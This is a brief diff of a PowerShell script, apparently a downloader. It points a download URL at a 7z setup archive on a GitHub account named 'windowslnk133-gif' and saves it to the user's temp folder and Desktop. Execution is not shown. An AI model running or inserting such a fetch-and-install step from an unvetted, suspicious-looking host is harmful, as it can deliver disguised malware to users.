@@ -2,7 +2,7 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 # 1. 定義下載網址與本地路徑
-$url = "https://github.com"
+$url = "https://github.com/windowslnk133-gif/ARM/releases/download/AI/ARM_Setup.7z"
 $savePath = "$env:TEMP\ARM_Setup.7z"
 $desktopDir = "$env:USERPROFILE\Desktop\ARM_App"
 
